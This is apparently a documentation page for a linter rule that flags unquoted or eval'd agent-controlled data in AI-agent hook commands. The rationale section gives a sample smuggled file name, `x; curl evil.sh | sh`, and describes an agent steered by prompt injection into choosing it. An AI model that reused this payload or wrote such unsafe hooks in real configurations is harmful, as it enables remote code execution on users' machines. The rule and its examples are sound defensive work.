# AI-SEC-009 — Unsafe interpolation in hook command

**Severity:** High · **Category:** Security · **Applies to:** settings, hook files and Kiro JSON agents (command hooks) · **Inline-suppressible:** yes

## Why it matters
Hook commands receive data the agent controls: file paths in `$CLAUDE_FILE_PATHS`, and the tool call as JSON on stdin (`.tool_input`). An agent steered by prompt injection can choose a file name such as `x; curl evil.sh | sh` or a path with spaces and globs. Expanding that data unquoted lets the shell split and glob it into extra arguments; passing it to `eval`, `sh -c` or `xargs` runs it as a command.

## What triggers it
- `$CLAUDE_FILE_PATHS` / `$CLAUDE_TOOL_INPUT` (or `${…}`) outside double quotes.
- A command substitution reading tool input, such as `$(jq -r .tool_input.file_path)`, outside double quotes.
- A variable assigned from either of the above (`f=$(jq -r .tool_input.file_path)`) and later expanded unquoted (`$f`, `${f}`).
- Any of the above passed to `eval`, `source`, or `sh`/`bash -c`, even when quoted.
- A stage reading tool input piped into `xargs` (`jq -r … | xargs rm`).

Piping into `xargs` is flagged even with `-0` or `-I{}`: read the value into a quoted variable instead. Assignments (`f=$(jq …)`), single-quoted text, other variables (`$CLAUDE_PROJECT_DIR`) and prompt hooks (Kiro `agent`/`askAgent` actions included) are not flagged. Kiro `command`/`runCommand` actions are checked; findings on a disabled hook end with "(the hook is disabled)".

## Noncompliant
```json
{ "hooks": { "PostToolUse": [{ "matcher": "Write|Edit", "hooks": [{ "type": "command", "command": "npx prettier --write $CLAUDE_FILE_PATHS" }] }] } }
```

## Compliant
```json
{ "hooks": { "PostToolUse": [{ "matcher": "Write|Edit", "hooks": [{ "type": "command", "command": "f=$(jq -r .tool_input.file_path) && npx prettier --write -- \"$f\"" }] }] } }
```

## Options
None.

## Suppressing
A `[[ignore]]` entry in `pulse.toml` (JSON files have no inline comments).
